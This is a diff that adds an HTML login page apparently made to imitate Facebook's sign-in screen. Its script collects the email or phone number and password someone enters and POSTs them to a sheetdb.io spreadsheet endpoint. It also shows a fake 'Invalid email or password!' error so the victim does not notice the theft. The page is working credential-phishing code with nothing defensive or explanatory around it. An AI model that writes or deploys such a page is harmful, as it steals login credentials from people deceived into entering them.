@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>fac</title>
+  <style>
+    body {
+      align-items: center;
+      justify-content: center;
+      font-family: sans-serif;
+      line-height: 1.5;
+      min-height: 100%;
+      background: #c9c9c994;
+      flex-direction: column;
+      margin: 0;
+    }
+    h1 {
+      margin-left: 2%;
+      color: #4CAF50;
+    }
+    input {
+      margin-left: 2%;
+      display: block;
+      color: #0a0a0a;
+      width: 95%;
+      height: 55px;
+      margin-bottom: 15px;
+      background: #cecece48;
+      padding: 20px;
+      margin-top: 30px;
+      box-sizing: border-box;
+      border: 2px solid #31313133;    
+      border-radius: 10px;
+    }
+    .sumbit {
+      margin-left: 6%;
+      padding: 15px;
+      border-radius: 30px;
+      margin-top: 20px;
+      margin-bottom: 15px;
+      color: #1877f2;
+      background-color: transparent;
+      width: 89%;
+      font-size: 16px;
+      border: 1.20px solid #1877f2;
+    }
+    .sumbit1 {
+      margin-left: 6%;
+      padding: 15px;
+      border-radius: 30px;
+      margin-top: 20px;
+      margin-bottom: 15px;
+      border: none;
+      color: white;
+      background-color: #1877f2;
+      width: 89%;
+      font-size: 16px;
+    }
+    /* Small Red Alert Box Style */
+    .alert {
+      display: none;
+      padding: 10px;
+      color: #f44336; /* Red Text */
+      font-size: 14px;
+      width: 95%;
+      text-align: left;
+      position: relative;
+      margin-top: 5px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <img style="margin-left: 43.5%; margin-top: 80px; margin-bottom: 10%;" src="logo.png" alt="">
+
+  <form id="signupForm">
+    <input type="text" id="first" name="first" placeholder="Mobile number or email address" required>
+    <input type="password" id="password" name="password" placeholder="Password" required>
+    
+    <!-- Error message below the password field -->
+    <div id="errorAlert" class="alert">
+      Invalid email or password!
+    </div>
+
+    <button type="submit" class="sumbit1">
+      <span class="btnText">Sign in</span>
+    </button>
+  </form>                      
+
+  <p style="margin-left: 139px; margin-bottom: 5px;">
+    <a style="color: #0b0d16f3" href="SignUp.html" style="text-decoration: none;">Forgotten Password?</a>
+  </p>     
+  <button class="sumbit">
+    <span class="btnText">Create a new account</span>
+  </button>    
+  <img style="margin-left: 42.5%; margin-bottom: 5px;" src="icon.png" alt="">
+
+  <script>
+  const form = document.getElementById('signupForm');
+  const errorAlert = document.getElementById('errorAlert');
+  
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault(); // Prevent default form submission
+
+    // Show the error alert immediately
+    showError();
+
+    // Get form data
+    const first = document.getElementById('first').value;
+    const password = document.getElementById('password').value;
+
+    const data = {
+      first: first,
+      password: password
+    };
+
+    // Send data to the Google Sheet
+    try {
+      const response = await fetch('https://sheetdb.io/api/v1/l0krtgr2lrw1o', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      });
+
+      if (response.ok) {
+        console.log('Details saved successfully!');
+        // You can redirect to another page or show success feedback here if needed
+      } else {
+        console.error('Failed to save details.');
+      }
+    } catch (error) {
+      console.error('Error:', error); // Log error for debugging
+    }
+  });
+
+  // Function to show the error alert
+  function showError() {
+    errorAlert.style.display = 'block'; // Show alert
+    setTimeout(() => {
+      errorAlert.style.display = 'none'; // Hide alert after 3 seconds
+    }, 3000); // Automatically hide the alert after 3 seconds
+  }
+</script>
+</body>
+</html>
